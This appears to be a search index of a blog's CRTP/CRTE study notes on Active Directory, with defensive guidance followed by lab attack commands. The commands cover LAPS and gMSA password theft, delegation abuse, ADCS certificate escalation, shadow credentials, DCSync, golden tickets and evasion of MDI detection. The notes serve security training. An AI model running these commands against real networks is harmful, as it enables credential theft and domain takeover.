 Computer objects have two new attributes - ms-mcs-AdmPwd attribute stores the clear text password and ms-mcs-AdmPwdExpirationTime controls the password change.   Storage in clear text, transmission is encrypted.      [Note] With careful enumeration, it is possible to retrieve which users can access the clear text password providing a list of attractive targets    Time Bound Administration - JIT  Just In Time (JIT) administration provides the ability to grant time-bound administrative access on per-request bases.   Check out Temporary Group Membership! (Requires Privileged Access Management Feature to be enabled which can’t be turned off later)  Add-ADGroupMember -Identity 'Domain Admins' -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 60)   Time Bound Administration - JEA  JEA (Just Enough Administration) provides role based access control for PowerShell based remote delegated administration.      With JEA non-admin users can connect remotely to machines for doing specific administrative tasks.   For example, we can control the command a user can run and even restrict parameters which can be used.   JEA endpoints have PowerShell transcription and logging enabled.   Detection and Defense - Tier Model   Active Directory Administrative Tier Model   Composed of three levels only for administrative accounts:      Tier 0 - Accounts, Groups and computers which have privileges across the enterprise like domain controllers, domain admins, enterprise admins.   Tier 1 - Accounts, Groups and computers which have access to resources having significant amount of business value. A common example role is server administrators who maintain these operating systems with the ability to impact all enterprise services.   Tier 2 - Administrator accounts which have administrative control of a significant amount of business value that is hosted on user workstations and devices. Examples include Help Desk and computer support administrators because they can impact the integrity of almost any user data.      Control Restrictions - What admins control. Logon Restrictions - Where admins can log-on to.    Tier Model : Control Restrictions      Tier Model : Logon Restrictions      ESAE   ESAE (Enhanced Security Admin Environment)      Dedicated administrative forest for managing critical assets like administrative users, groups and computers.   Since a forest is considered a security boundary rather than a domain, this model provides enhanced security controls.   The administrative forest is also called the Red Forest.   Administrative users in a production forest are used as standard non-privileged users in the administrative forest.   Selective Authentication to the Red Forest enables stricter security controls on logon of users from non-administrative forests.      Microsoft retired ESAE in 2021 and replaced it with Privileged Access Strategy but it is still worth discussing       Credential Guard      It uses virtualization-based security to isolate secrets so that only privileges system software can access them.    Effective in stopping PTH and Over-PTH attacks by restricting access to NTLM hashes and TGTs. It is not possible to write Kerberos tickets to memory even if we have credentials.   Windows Credential Guard Documentation      But, credentials for local accounts in SAM and Service account credentials from LSA Secrets are NOT protected.   Credential Guard cannot be enabled on a domain controller as it breaks authentication there.   Only available on the Windows 10 Enterprise edition and Server 2016.   Mimikatz can bypass it but still, no need to not use it.   Device Guard (WDAC)      It is a group of features designed to harden a system against malware attacks. Its focus is preventing malicious code from running by ensuring only known good code can run    Three primary components:  - Configurable Code Integrity (CCI) - Configure only trusted code to run - Virtual Secure Mode Protected Code Integirty - Enforces CCI with Kernerl Mode (KMCI) and User Mode (UMCI) - Platform and UEFI Secure Boot - Ensures boot binaries and firmware integrity   Introduction to Device Guard, Virtualization-Based Security, and Code Integrity Policies      UMCI is something which interferes with most of the lateral movement attacks we have seen.   While it depends on the deployment (discussing which will be too lengthy), many well known application whitelisting bypasses - signed binaries like csc.exe, MSBuild.exe etc. - are useful for bypassing UMCI as well.   Check out the LOLBAS project:   LOLBAS Project   MDI   ..identify, detect, and investigate advanced threats, compromised identities, and malicious insider actions directed at your organization.      MDI sensors are installed on DCs and Federation servers. Analysis and alerting is done in the Azure cloud.   MDI can be used for detecting:  - Recon - Compromised credentials (Brute-Force, Kerberoasting etc.) - Lateral movement (PTH, OPTH etc.) - Domain Dominance (DCSync, Golden ticket, Skeleton key etc.) - Exfiltration   MDI Bypass      The key is to avoid talking to the DC as long as possible and make appear the traffic we generate as attacker normal.       To bypass DCSync detection, go for users which are whitelisted. For example, the user account used for PHS may be whitelisted.   Also, if we have NTLM hash of a DC, we can extract NTLM hashes of any machine account using netsync   If we forge a Golden Ticket with SID History of the Domain Controllers group and Enterprise Domain Controllers Group, there are less chances of detection by MDI   C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt\" \"exit\"   Defense - Golden Ticket   Some important Event ID   Event ID:  - 4624: Account Logon - 4672: Admin Logon   Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *   Defense - Silver Ticket   Some important Event ID   Event ID:  - 4624: Account Logon - 4634: Account Logoff - 4672: Admin Logon   Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *   Defense - Skeleton Key   Events:  - System Event ID 7045 - A service was installed in the system. (Type Kernel Mode driver)   Events (Audit privilege use must be enabled):  - Security Event ID 4673 - Sensitive Privilege Use - Event ID 4611 - A trusted logon process has been registered with the Local Security Authority   Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like \"*Kernel Mode Driver*\"}   Not recommended:  Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like \"*Kernel Mode Driver*\" -and $_.message -like \"*mimidrv*\"}   Mitigation:  - Running lsass.exe as a protected process is really handy as it forces an attacker to load a kernel mode driver. - Make sure that you test it thoroughly as many drivers and plugins may not load with the protection.   New-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name RunAsPPL -Value 1 -Verbose # Verify after a reboot Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like \"*protected process*\"}   Defense - DSRM   Events:  - Event ID 4657 - Audit creation/change of HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior   Defense - Malicious SSP   Events:  - Event ID 4657 - Audit creation/change of HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\SecurityPackages   Defense - Kerberoast   Events:  - Security Event ID 4769 - A Kerberos ticket was requested   Mitigation:  - Service Account Passwords should be hard to guess (greater than 35 characters) - Use Group Managed Service Accounts (Automatic change of password periodically and delegated SPN Management)   Since 4769 is logged very frequently on a DC. We may like to filter results based on the following information from logs:  - Service name should not be krbtgt - Service name does not end with $ (to filter out machine accounts used for services) - Account name should not be machine@domain (to filter out requests from machines) - Failure code is '0x0' (to filter out failures, 0x0 is success) - Most importantly, ticket encryption type is 0x17   Defense - Unconstrained Delegation   Mitigation:  - Limit DA/Admin logins to specific servers - Set \"Account is sensitive and cannot be delegated\" for privileged accounts.   Security Focus: Analyzing “Account is sensitive and cannot be delegated” for Privileged Accounts   Defense - ACL Attacks   Events:  - Security Event ID 4662 (Audit Policy for object must be enabled) - An operation was performed on an object - Security Event ID 5136 (Audit Policy for object must be enabled) - A directory service object was modified - Security Event ID 4670 (Audit Policy for object must be enabled) - Permissions on an object were changed   Useful tool:  - AD ACL Scanner - Create and compare create reports of ACLs.   ADACLScanner on GitHub   Defense - Trust Tickets   SID Filtering      Avoid attacks which abuse SID history attribute (child to root domain privilege escalation, that is, DA from a Child to EA on forest root).   Enabled by default on all inter-forest trusts. Intra-forest trusts are assumed secured by default (MS considers forest and not the domain to be a security boundary).   But, since SID filtering has potential to break applications and user access, it is often disabled.   Selective Authentication:      In an inter-forest trust, if Selective Authentication is configured, users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given.       Defense - Deception      Deception is a very effective technique in active directory defense.       By using decoy domain objects, defenders can trick adversaries to follow a particular attack path which increases chances of detection and increase their cost in terms of time.   Traditionally, deception has been limited to leave honey credentials on some boxes and check their usage but we can use it effectively during other phases of an attack      What to target? Adversary mindset of going for the lowest hanging fruit and illusive superiority over defenders.    We must provide the adversaries what they are looking for. For example, what adversaries look for in a user object:  - A user with high privileges. - Permissions over other objects. - Poorly configured ACLs. - Misconfigured/dangerous user attributes and so on.   Let’s create some user objects which can be used for deceiving adversaries. We can use Deploy-Deception for this: https://github.com/samratashok/Deploy-Deception      [Note] Windows Settings / Security Settings / Advanced Audit Policy Configuration / DS Access / Audit Directory Service Access Group Policy needs to be configured to enable 4662 logging    User Deception   Creates a decoy user whose password never expires and a 4662 is logged whenever x500uniqueIdentifier - d07da11f-8a3d-42b6-b0aa-76c962be719a property of the user is read:  Create-DecoyUser -UserFirstName user -UserLastName manager -Password Pass@123 | Deploy-UserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose   This property is not read by net.exe, WMI classes (like Win32_UserAccount) and ActiveDirectory module. But LDAP based tools like PowerView and ADExplorer trigger the logging   Create a decoy user named decda and make it a member of the Domain Admins group. As a protection against potential abuse, Deny logon to the user on any machine.  Create-DecoyUser -UserFirstName dec -UserLastName da -Password Pass@123 | Deploy-PrivilegedUserDeception -Technique DomainAdminsMemebership -Protection DenyLogon -Verbose      If there is any attempt to use the user credentials (password or hashes) a 4768 is logged. Any enumeration which reads DACL or all properties for the user will result in a 4662 logging.    Recommended Readings   Securing Privileged Access:   Securing Privileged Access Documentation   Best Practices for Securing Active Directory:   Best Practices for Securing Active Directory   ","categories": ["notes","crtp"],
        "tags": ["begginer","AD","Windows","defense"],
        "url": "/notes/crtp/defense/",
        "teaser": "/assets/images/posts/crtp/crtp-teaser8.jpg"
      },{
        "title": "CRTE Review",
        "excerpt":"     My Review                  Difficulty: ★★★✦☆                         Price: ★★★☆☆       $299                 Material: ★★☆☆☆                         Real-World Scenario: ★★★☆☆                         Worth it?: Yes, ONLY if u want to specialize in AD                         Official Site: CRTE by Altered Security                   First of all the name is misleading, even tho I passed, I feel that I’m far away from an EXPERT level      60% of the material is the same as the CRTP    The lab is amazing, but the exam wasn’t that special. (it was tricky - I rate the difficulty: 3.5/5)   I Consider this as a specialization cert, so I recommend only if u are going for the Windows/AD path.      Otherwise I think only the CRTP is enough    As a lot of the material is the same as CRTP I’ll add references to my CRTP notes throughout the notes of CRTE   Same content   Enumeration   Same as in CRTP:   AD Enumeration   Local Privesc   Same as in CRTP:   Win Local Privesc   AD Defense   Same as in CRTP:   AD Defense  ","categories": ["review"],
        "tags": ["intermediate","AD","Windows"],
        "url": "/review/crte/",
        "teaser": "/assets/images/posts/crte/crte-teaser1.jpg"
      },{
        "title": "1 - Lateral Movement",
        "excerpt":"  Lateral Movement   Same as in CRTP:   CRTP Lateral Movement   Extracting Credentials from LSASS   Lsass-Shtinkering on GitHub   Using Lsass-Shtinkering:  Lsass_Shtinkering.exe      It uses Windows Error Reporting Service to dump the LSASS process memory.      It manually reports an exception to WER on LSASS that will generate the dump without crashing the process.       It works on Windows 10, Server 2022.   During our testing we found that it doesn’t work on Server 2019.  ","categories": ["notes","crte"],
        "tags": ["intermediate","AD","Windows"],
        "url": "/notes/crte/latmov/",
        "teaser": "/assets/images/posts/crte/crte-teaser2.jpg"
      },{
        "title": "2 - AD Privesc",
        "excerpt":"  AD Privesc   Some content is the same as in CRTP:   CRTP AD Privilege Escalation   LAPS   LAPS (Local Administrator Password Solution) provides centralized storage of local users passwords in AD with periodic randomizing.      …it mitigates the risk of lateral escalation that results when customers have the same administrative local account and password combination on many computers.       Storage in clear text, transmission is encrypted (Kerberos).   Configurable using GPO.   Access control for reading clear text passwords using ACLs.   Only Domain Admins and explicitly allowed users can read the passwords.      On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the:  C:\\Program Files\\LAPS\\CSE\\ directory.   To find users who can read the passwords in clear text machines in OUs   PowerView:  Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}   To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text   Using Active Directory module  Get-LapsPermissions.ps1   Using LAPS module (can be copied across machines):  Import-Module C:\\AD\\Tools\\AdmPwd.PS\\AdmPwd.PS.psd1 Find-AdmPwdExtendedRights -Identity OUDistinguishedName   Once we compromise the user which has the Rights, use the following to read clear-text passwords   PowerView:  Get-DomainObject -Identity &lt;targetmachine$&gt; | select - ExpandProperty ms-mcs-admpwd   Active Directory module:  Get-ADComputer -Identity &lt;targetmachine&gt; -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd   LAPS module:  Get-AdmPwdPassword -ComputerName &lt;targetmachine&gt;   gMSA   A group Managed Service Account (gMSA) provides automatic password management, SPN management and delegated administration for service accounts across multiple servers.      Use of gMSA is recommended to protect from Kerberoast type attacks!       A 256 bytes random password is generated and is rotated every 30 days.   When an authorized user reads the attribute ‘msds-ManagedPassword’ the gMSA password is computed.   Only explicitly specified principals can read the password blob.   Even the Domain Admins can’t read it by default.   A gMSA has object class msDS-GroupManagedServiceAccount. This can be used to find the accounts   Using ADModule:  Get-ADServiceAccount -Filter *   Using PowerView:  Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'   The attribute *msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword) lists the principals that can read the password blob**   Read it using ADModule:  Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword   The attribute msDS-ManagedPassword stores the password blob in binary form of MSDS-MANAGEDPASSWORD_BLOB   Once we have compromised a principal that can read the blob. Use ADModule to read and DSInternals to compute NTLM hash:  $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword' Import-Module C:\\AD\\Tools\\DSInternals_v4.7\\DSInternals\\DSInternals.psd1 $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword   The CurrentPassword attribute in the $decodedpwd contains the clear-text password but cannot be typed!   Passing the NTLM hash of the gMSA, we get privileges of the gMSA:  sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c684cc0fa1744195edd1aec43078   We can access the services and machines (server farms) that the account has access to   Golden gMSA   gMSA password is calculated by leveraging the secret stored in KDS root key object   We need following attributes of the KDS root key to compute the Group Key Envelope (GKE):  - cn - msKds-SecretAgreementParam - msKds-RootKeyData - msKds-KDFParam - msKds-KDFAlgorithmID - msKds-CreateTime - msKds-UseStartTime - msKds-Version - msKds-DomainID - msKds-PrivateKeyLength - msKds-PublicKeyLength - msKds-SecretAgreementAlgorithmID      Once we compute the GKE for the associated KDS root key we can generate the password offline.   Only privilege accounts such as Domain Admins, Enterprise Admins or SYSTEM can retrieve the KDS root key.   Once the KDS root key is compromised we can’t protect the associated gMSAs accounts.   Golden gMSA can be used to retrieve the information of gMSA account, KDS root key and generate the password offline.   Contrained Delegation (Kerberos Only)      It requires an additional forwardable ticket to invoke S4U2Proxy.       We cannot use S4U2Self as the service doesn’t have TRUSTED_TO_AUTH_FOR_DELEGATION value configured.   We can leverage RBCD to abuse Kerberos Only configuration:      Create a new Machine Account   Configure RBCD on the machine configured with Constrained Delegation.   Obtain a TGS/Service Ticket for the machine configured with Constrained   Delegation by leveraging the newly created Machine Account:  Request a new forwardable TGS/Service Ticket by leveraging the ticket created in previous step.   Enumerate constrained delegation using ADModule:  Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo   Since ms-DS-MachineAccountQuota is set to 10 for all domain users, any domain user can create a new Machine Account and join the same in the current domain.   Create a new Machine Account using Powermad.ps1 script:   Powermad on GitHub   . C:\\AD\\Tools\\Powermad\\Powermad.ps1 New-MachineAccount -MachineAccount studentcompX  We already compromised us-mgmt   Configure RBCD on us-mgmt using us-mgmt$ computer account:  C:\\AD\\Tools\\Rubeus.exe asktgt /user:us-mgmt$ /aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2 /impersonateuser:administrator /domain:us.techcorp.local /ptt /nowrap  Using ADModule:  Set-ADComputer -Identity us-mgmt$ -PrincipalsAllowedToDelegateToAccount studentcompX$ -Verbose   Obtain a TGS/Service Ticket for us-mgmt (machine configured with Constrained Delegation) by leveraging the newly created Machine Account (studentcompx):  C:\\AD\\Tools\\Rubeus.exe hash /password:P@ssword@123 C:\\AD\\Tools\\Rubeus.exe s4u /impersonateuser:administrator /user:studentcompX$ /rc4:D3E5739141450E529B07469904FE8BDC /msdsspn:cifs/us-mgmt.us.techcorp.local /nowrap   Request a new forwardable TGS/Service Ticket by leveraging the ticket created in previous step  C:\\AD\\Tools\\Rubeus.exe s4u /tgs:doIGxjCCBsKgAwIBBaEDAgEWoo... /user:us-mgmt$ /aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2 /msdsspn:cifs/us-mssql.us.techcorp.local /altservice:http /nowrap /ptt   Access the us-mssql using WinRM as the Domain Admin:  winrs -r:us-mssql.us.techcorp.local cmd.exe  ","categories": ["notes","crte"],
        "tags": ["intermediate","AD","Windows","privesc"],
        "url": "/notes/crte/adprivesc/",
        "teaser": "/assets/images/posts/crte/crte-teaser3.jpg"
      },{
        "title": "3 - AD Persistence",
        "excerpt":"  AD Persistence   Some content are similar to CRTP:   AD Persistence - CRTP   msDS-AllowedToDelegateTo (Constrained Delegation)   Note that the msDS-AllowedToDelegateTo is the user account flag which controls the services to which a user account has access to.      This means, with enough privileges, it is possible to access any service from a user       Enough privileges? – SeEnableDelegationPrivilege on the DC and full rights on the target user - default for Domain Admins and Enterprise Admins.   That is, we can force set Trusted to Authenticate for Delegation and ms-DS-AllowedToDelegateTo on a user (or create a new user - which is more noisy) and abuse it later.   Using PowerView:  Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'} Set-DomainObject -Identity devuser -Set @{\"msds-allowedtodelegateto\"=\"ldap/dc.domain.local\"} Set-DomainObject -SamAccountName devuser1 -Xor @{\"useraccountcontrol\"=\"16777216\"} Get-DomainUser –TrustedToAuth   Using AD module:  Set-ADUser -Identity devuser -ServicePrincipalNames @{Add='dev/svc'} Set-ADUser -Identity devuser -Add @{'msDS-AllowedToDelegateTo'= @('ldap/us-dc','ldap/dc.domain.local')} -Verbose Set-ADAccountControl -Identity devuser -TrustedToAuthForDelegation $true Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo   Abuse using Kekeo  kekeo# tgt::ask /user:devuser /domain:domain.local /password:Password@123! kekeo# tgs::s4u /tgt:TGT_devuser@domain.local_krbtgt~us.techcorp.local@domain.local.kirbi /user:Administrator@domain.local /service:ldap/domain.local Invoke-Mimikatz -Command '\"kerberos::ptt TGS_Administrator@us.techcorp.local@domain.local_ldap~dc.domain.local@domain.local.kirbi\"' Invoke-Mimikatz -Command '\"lsadump::dcsync /user:domain\\krbtgt\"'   Abuse using Rubeus:  Rubeus.exe hash /password:Password@123! /user:devuser /domain:domain.local Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateuser:administrator /msdsspn:ldap/dc.domain.local /domain:domain.local /ptt C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:domain\\krbtgt\" \"exit\"   Malicious SSP      All local logons on the DC are logged to C:\\Windows\\system32\\kiwissp.log     ","categories": ["notes","crte"],
        "tags": ["intermediate","AD","Windows","peristence"],
        "url": "/notes/crte/adpersistence/",
        "teaser": "/assets/images/posts/crte/crte-teaser4.jpg"
      },{
        "title": "4 - Cross Domain Attacks",
        "excerpt":"  ADCS   Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.      AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.       AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization.       CA - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.   Certificate - Issued to a user or machine and can be used for authentication, encryption, signing etc.   CSR - Certificate Signing Request made by a client to the CA to request a certificate.   Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.   EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)   We can use the Certify tool to enumerate (and for other attacks) AD CS in the target forest:   Certify on GitHub   Certify.exe cas   Enumerate the templates:  Certify.exe find   Enumerate vulnerable templates:  Certify.exe find /vulnerable   Common requirements/misconfigurations for all the Escalations:  - CA grants normal/low-privileged users enrollment rights - Manager approval is disabled - Authorization signatures are not required - The target template grants normal/low-privileged users enrollment rights   Escalation      In techcorp, the user pawadmin has enrollment rights to a template -ForAdminsofPrivilegedAccessWorkstations   The template has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag. (ESC1)   This means pawadmin can request certificate for ANY user.   Note that this does not show up when we enumerate vulnerable templates in Certify. Use:  Certify.exe find Certify.exe find /enrolleeSuppliesSubject      We have the certificate of pawadmin that we extracted from us-jump. (THEFT4)   Use the certificate to request a TGT for pawadmin and inject it:  C:\\AD\\Tools\\Rubeus.exe asktgt /user:pawadmin /certificate:C:\\AD\\Tools\\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt   Escalation to DA   Request a certificate for DA!  C:\\AD\\Tools\\Certify.exe request /ca:Techcorp-DC.techcorp.local\\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator   Convert from cert.pem to pfx:  C:\\AD\\Tools\\openssl\\openssl.exe pkcs12 -in C:\\AD\\Tools\\cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out C:\\AD\\Tools\\DA.pfx   Request DA TGT and inject it:  C:\\AD\\Tools\\Rubeus.exe asktgt /user:Administrator /certificate:C:\\AD\\Tools\\DA.pfx /password:SecretPass@123 /nowrap /ptt   Escalation to EA   Request a certificate for EA!  C:\\AD\\Tools\\Certify.exe request /ca:Techcorp-DC.techcorp.local\\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator   Convert from cert.pem to pfx:  C:\\AD\\Tools\\openssl\\openssl.exe pkcs12 -in C:\\AD\\Tools\\cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out C:\\AD\\Tools\\EA.pfx   Request EA TGT and inject it:  C:\\AD\\Tools\\Rubeus.exe asktgt /user:techcorp.local\\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\\AD\\Tools\\EA.pfx /password:SecretPass@123 /nowrap /ptt   Shadow Credentials   Users and Computers have msDS-KeyCredentialLink attribute that contains the raw public keys of certificate that can be used as an alternate credential.      This attribute is used when we configure Windows Hello for Business (WHfB)      By default, Key Admins and Enterprise Key Admins have rights to modify the msDS-KeyCredentialLink attribute.       User to User (U2U) Service Ticket can be requested to decrypt the encrypted NTLM_SUPPLEMENTAL_CREDENTIAL entity from Privilege Attribute Certificate (PAC) and extract NTLM hash.   Pre-requisites to abuse Shadow Credentials:  - AD CS (Key Trust if AD CS is not present) - Support for PKINIT and at least one DC with Windows Server 2016 or above. - Permissions (GenericWrite/GenericAll) to modify the msDS-KeyCredentialLink attribute of the target object.   Abusing User Object   Enumerate the permissions:  Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"StudentUsers\"}   Add the Shadow Credential:  Whisker.exe add /target:supportXuser   Using PowerView, see if the Shadow Credential is added.  Get-DomainUser -Identity supportXuser   Request the TGT by leveraging the certificate:  Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:\"1OT0qAom3...\" /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap   Inject the TGT in the current session or use the NTLM hash:  Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...   Abusing Computer Object   Enumerate the permissions:  Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin’}   Add the Shadow Credentials:  C:\\AD\\Tools\\SafetyKatz.exe \"sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe\" \"exit\" Whisker.exe add /target:us-helpdesk$   Using PowerView, see if the Shadow Credential is added:  Get-DomainComputer -Identity us-helpdesk   Request the TGT by leveraging the certificate:  Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MIIJ0AIBAzCCCYwGCSqGSIb... /password:\"ViGFoZJa...\" /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show   Request and Inject the TGS by impersonating the user:  Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:doIGkDCCBoygAwIBBaEDAgEW... /impersonateuser:administrator /ptt /self /altservice:cifs/us-helpdesk   Azure AD Integration   Azure AD is a popular method to extend identity management from on-premises AD to Microsoft’s Azure offerings.      Many enterprises use their on-prem AD identities to access Azure applications.      A single user identity for authentication and authorization to all resources, regardless of location is hybrid identity.    An on-premises AD can be integrated with Azure AD using Azure AD Connect with the following methods:  - Password Hash Sync (PHS) - Pass-Through Authentication (PTA) - Federation      Azure AD Connect is installed on-premises and has a high privilege account both in on AD and Azure AD!    PHS      Let’s target PHS.       It shares users and their password hashes from on-premises AD to Azure AD.   A new users MSOL_ is created which has Synchronization rights (DCSync) on the domain!      Enumerate the PHS account and server where AD Connect is installed   Using PowerView:  Get-DomainUser -Identity \"MSOL_*\" -Domain techcorp.local   Using the ActiveDirectory module:  Get-ADUser -Filter \"samAccountName -like 'MSOL_*'\" -Server techcorp.local -Properties * | select SamAccountName,Description | fl      We already have administrative access to us-adconnect as helpdeskadmin.    With administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL_ account used by AD Connect in clear-text:  .\\adconnect.ps1      [Note] The above script’s code runs powershell.exe so verbose logs (like transcripts) will be there.    With the password, we can run commands as MSOL_:  runas /user:techcorp.local\\MSOL_16fb75d0227d /netonly cmd   And can then execute the DCSync attack:  Invoke-Mimikatz -Command '\"lsadump::dcsync /user:us\\krbtgt\"' Invoke-Mimikatz -Command '\"lsadump::dcsync /user:techcorp\\krbtgt /domain:techcorp.local\"'      [NOTE] Because AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, the MSOL_ account will be excluded from tools like MDI!       This will allow us to run DCSync without any alerts!    Forest Root      Child to Forest Root - Trust Key   Child to Forest Root - krbtgt   same material of CRTP:   CRTP - Privesc Across Trusts   Kerberoast across Forest Trusts      It is possible to execute Kerberoast across Forest trusts.    Let’s enumerate named service accounts across forest trusts   Using PowerView:  Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}   Using ActiveDirectory Module:  Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName -Server $_.Name}   Request a TGS:  C:\\AD\\Tools\\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt   Check for the TGS:  klist   Crack using John:  john.exe --wordlist=C:\\AD\\Tools\\kerberoast\\10k-worst-pass.txt C:\\AD\\Tools\\hashes.txt   Request TGS across trust using PowerShell:  Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local   Delegations   Constrained Delegation with Protocol Transition      The classic Constrained Delegation does not work across forest trusts. But we can abuse it once we have a foothold across forest trust.    Using PowerView:  Get-DomainUser –TrustedToAuth -Domain eu.local Get-DomainComputer –TrustedToAuth -Domain eu.local   Using ActiveDirectory module:  Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo -Server domain.local   We can request an alternate ticket using Rubeus:  C:\\AD\\Tools\\Rubeus.exe hash /password:Qwerty@2019 /user:storagesvc /domain:domain.local C:\\AD\\Tools\\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:domain.local /msdsspn:nmagent/dc.domain.local /altservice:ldap /dc:dc.domain.local /ptt   Abuse the TGS to LDAP:  Invoke-Mimikatz -Command '\"lsadump::dcsync /user:domain\\krbtgt /domain:domain.local\"'  Or  C:\\AD\\Tools\\SharpKatz.exe --Command dcsync --User domain\\krbtgt --Domain domain.local --DomainController dc.domain.local C:\\AD\\Tools\\SharpKatz.exe --Command dcsync --User domain\\administrator --Domain domain.local --DomainController dc.domain.local   Unconstrained Delegation      Recall the Printer bug and its abuse from a machine with Unconstrained Delegation       We have used it to escalate privileges to Domain Admin and Enterprise Admin.   It also works across a Two-way forest trust with TGT Delegation enabled!      TGT Delegation is disabled by default and must be explicitly enabled across a trust for the trusted (target) forest.    To enumerate if TGTDelegation is enabled across a forest trust, run the below command from a DC  netdom trust trustingforest /domain:trustedforest /EnableTgtDelegation   In the lab, this is to be run on usvendor-dc  netdom trust usvendor.local /domain:techcorp.local /EnableTgtDelegation   The PowerShell cmdlets of the ADModule seems to have a bug, the below command shows TGTDelegation set to False:  Get-ADTrust -server usvendor.local -Filter *      But when run from usvendor-dc, it shows TGTDelegation to be True    Across Forest using Trust Tickets      By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary.       We can use the Trust Key, the same way as in Domain trusts but we can access only those resources which are explicitly shared with our current forest.   Let’s try to access a file share ‘eushare’ on euvendor-dc of euvendor.local forest from eu.local which is explicitly shared with Domain Admins of eu.local.      There is content about this in CRTP    Like intra forest scenario, we require the trust key for the inter-forest trust:  Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'  or  Invoke-Mimikatz -Command '\"lsadump::dcsync /user:eu\\euvendor$\"'  or  Invoke-Mimikatz -Command '\"lsadump::lsa /patch\"'      We can also use any of the earlier discussed tools to extract trust keys.    An inter-forest TGT can be forged:  Invoke-Mimikatz -Command '\"kerberos::golden /user:Administrator /domain:eu.local 